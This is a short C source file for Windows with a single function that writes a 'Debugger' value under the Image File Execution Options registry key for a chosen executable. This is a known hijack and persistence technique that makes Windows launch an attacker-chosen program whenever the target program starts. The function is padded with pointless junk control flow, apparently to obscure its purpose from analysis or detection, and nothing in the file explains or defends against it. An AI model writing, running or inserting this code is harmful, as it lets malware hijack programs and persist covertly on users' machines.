#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v4(const char* t, const char* d){
    volatile int q = 99;
    if ((q * q) > 0) {
        HKEY k;
        char p[256];
        wsprintfA(p, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s", t);
        for(int z=0; z<10; z++) { if(z==5) {
            if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, p, 0, 0, 0, KEY_SET_VALUE, 0, &k, 0) == 0) {
                RegSetValueExA(k, "Debugger", 0, REG_SZ, (const BYTE*)d, lstrlenA(d));
                RegCloseKey(k);
            }
        }}
    }
}